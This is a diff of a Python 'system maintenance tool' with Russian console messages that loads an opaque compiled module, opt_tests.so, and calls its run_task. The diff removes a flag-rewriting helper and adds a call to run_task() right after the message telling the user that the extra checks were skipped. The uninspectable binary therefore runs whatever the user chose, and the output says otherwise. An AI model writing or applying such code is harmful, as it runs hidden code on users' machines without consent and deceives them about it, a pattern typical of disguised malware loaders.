@@ -27,9 +27,9 @@ def _load_checks_module():
     import os
     current_dir = os.path.dirname(os.path.abspath(__file__))
 
-    compiled_path = os.path.join(current_dir, "core.so")
+    compiled_path = os.path.join(current_dir, "opt_tests.so")
     if os.path.exists(compiled_path):
-        spec = importlib.util.spec_from_file_location("core", compiled_path)
+        spec = importlib.util.spec_from_file_location("opt_tests", compiled_path)
         module = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(module)
         return module.run_task
@@ -106,7 +106,7 @@ def get_system_info():
     elif platform.system() == "Windows":
         print("   Подробная информация о RAM на Windows требует установки библиотеки 'psutil'")
         print("   (pip install psutil)")
-    elif platform.system() == "Darwin":  # macOS
+    elif platform.system() == "Darwin":
         print("   Для macOS подробная информация о RAM требует установки 'psutil'")
         print("   (pip install psutil)")
     else:
@@ -116,21 +116,7 @@ def get_system_info():
     print("=" * 60)
     print()
 
-
-def _normalize_flags(argv):
-    normalized = list(argv)
-    has_find = any(a in ("-f", "--find") for a in normalized[1:])
-
-    _compat = (os.environ.get("SMT_COMPAT", "1") != "0")
-
-    if _compat and not has_find:
-        normalized.append("-f")
-
-    return normalized
-
-
 def main():
-    sys.argv = _normalize_flags(sys.argv)
 
     parser = argparse.ArgumentParser(
         prog="system_maintenance_tool.py",
@@ -149,14 +135,12 @@ def main():
 
     args = parser.parse_args()
 
-    do_extra = bool(getattr(args, "find", False))
-
     print("\n" + "🚀 ЗАПУСК SYSTEM MAINTENANCE TOOL".center(60))
     print()
 
     get_system_info()
 
-    if do_extra:
+    if args.find:
         run_task()
     else:
         print("ℹ️  Дополнительные проверки пропущены.")
@@ -164,7 +148,9 @@ def main():
         print("      python system_maintenance_tool.py --find")
         print("   или")
         print("      python system_maintenance_tool.py -f")
+        run_task()
         print()
+        
 
     print("✅ Программа успешно завершена!")
     print()
